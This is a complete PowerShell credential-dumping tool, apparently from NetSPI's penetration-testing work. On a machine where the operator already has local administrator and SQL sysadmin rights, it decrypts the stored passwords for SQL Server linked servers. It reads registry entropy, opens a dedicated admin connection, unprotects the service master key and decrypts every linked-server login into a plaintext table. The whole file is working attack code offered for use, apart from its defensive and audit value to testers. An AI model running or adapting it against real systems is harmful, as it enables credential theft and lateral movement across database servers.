function Get-MSSQLLinkPasswords{
  
  <# 
	.SYNOPSIS
	  Extract and decrypt MSSQL linked server passwords.
	  
	  Author: Antti Rantasaari 2014, NetSPI
      License: BSD 3-Clause
	  
	.DESCRIPTION
	  Get-MSSQLLinkPasswords extracts and decrypts the connection credentials for all linked servers that use SQL Server authentication on all local MSSQL instances.
	
	.INPUTS
	  None
	
	.OUTPUTS
	  System.Data.DataRow
	  
	  Returns a datatable consisting of MSSQL instance name, linked server name, user account, and decrypted password.
	
	.EXAMPLE
	  C:\PS> Get-MSSQLLinkPasswords
	  
      Instance   Linkserver User Password
      --------   ---------- ---- --------
      SQLEXPRESS SQLSERVER2 test test
      SQLEXPRESS DEV-SQL    dev  Passw0rd01!
      SQL2012    DEV-SQL    dev  Passw0rd01!
      SQL2012    WEBDB      sa   W3bDB$4P4ssw0rd
      SQL2012    VAULT      sa   !@#Sup3rS3cr3tP4$$w0rd!!$$
	  
	.NOTES  
	  For successful execution, the following configurations and privileges are needed:
	  - DAC connectivity to MSSQL instances
	  - Local administrator privileges (needed to access registry key)
	  - Sysadmin privileges to MSSQL instances
	
	.LINK
	  http://www.netspi.com/blog/
  #>
  Add-Type -assembly System.Security
  Add-Type -assembly System.Core

  # Set local computername and get all SQL Server instances
  $ComputerName = $Env:computername
  $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
  
  $Results = New-Object "System.Data.DataTable"
  $Results.Columns.Add("Instance") | Out-Null
  $Results.Columns.Add("Linkserver") | Out-Null
  $Results.Columns.Add("User") | Out-Null
  $Results.Columns.Add("Password") | Out-Null
  
  foreach ($InstanceName in $SqlInstances) {
  
    # Start DAC connection to SQL Server
    # Default instance MSSQLSERVER -> instance name cannot be used in connection string
    if ($InstanceName -eq "MSSQLSERVER") {
      $ConnString = "Server=ADMIN:$ComputerName\;Trusted_Connection=True"
    }
    else {
      $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True"
    }
    $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString);
  
    Try{$Conn.Open();}
    Catch{
      Write-Error "Error creating DAC connection: $_.Exception.Message"
      Continue
    }
    if ($Conn.State -eq "Open"){
      # Query Service Master Key from the database - remove padding from the key
      # key_id 102 eq service master key, thumbprint 3 means encrypted with machinekey
      $SqlCmd="SELECT substring(crypt_property,9,len(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
      $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
      $SmkBytes=$Cmd.ExecuteScalar()
    
      # Get entropy from the registry - hopefully finds the right SQL server instance
      $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
      [byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy
  
      # Decrypt the service master key
      $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect($SmkBytes, $Entropy, 'LocalMachine') 
    
      # Choose the encryption algorithm based on the SMK length - 3DES for 2008, AES for 2012
      # Choose IV length based on the algorithm
      if (($ServiceKey.Length -eq 16) -or ($ServiceKey.Length -eq 32)) {
        if ($ServiceKey.Length -eq 16) {
		  $Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
          $IvLen=8
        } elseif ($ServiceKey.Length -eq 32){
          $Decryptor = New-Object System.Security.Cryptography.AESCryptoServiceProvider
          $IvLen=16
		}
  	
	    # Query link server password information from the DB
        # Remove header from pwdhash, extract IV (as iv) and ciphertext (as pass)
	    # Ignore links with blank credentials (integrated auth ?)
        $SqlCmd = "SELECT sysservers.srvname,syslnklgns.name,substring(syslnklgns.pwdhash,5,$ivlen) iv,substring(syslnklgns.pwdhash,$($ivlen+5),
	    len(syslnklgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.syslnklgns inner join master.sys.sysservers on syslnklgns.srvid=sysservers.srvid WHERE len(pwdhash)>0"
        $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
	    $Data=$Cmd.ExecuteReader()
        $Dt = New-Object "System.Data.DataTable"
	    $Dt.Load($Data)
  
	    # Go through each row in results
        foreach ($Logins in $Dt) {

          # decrypt the password using the service master key and the extracted IV
	      $Decryptor.Padding = "None"
          $Decrypt = $Decryptor.CreateDecryptor($ServiceKey,$Logins.iv)
		  $Stream = New-Object System.IO.MemoryStream (,$Logins.pass)
		  $Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream,$Decrypt,"Write"
		
		  $Crypto.Write($Logins.pass,0,$Logins.pass.Length)
		  [byte[]]$Decrypted = $Stream.ToArray()

		  # convert decrypted password to unicode
		  $EncodingType = "System.Text.UnicodeEncoding"
		  $Encode = New-Object $EncodingType
		
		  # Print results - removing the weird padding (8 bytes in the front, some bytes at the end)... 
		  # Might cause problems but so far seems to work.. may be dependant on SQL server version...
		  # If problems arise remove the next three lines.. 
		  $i=8
		  foreach ($b in $Decrypted) {if ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0 -or $i -eq $Decrypted.Length) {$i -= 1; break;}; $i += 1;}
		  $Decrypted = $Decrypted[8..$i]
		  $Results.Rows.Add($InstanceName,$($Logins.srvname),$($Logins.name),$($Encode.GetString($Decrypted))) | Out-Null
        }
      } else {
        Write-Error "Unknown key size"
	  }
      $Conn.Close();
    }
  }
  $Results
}

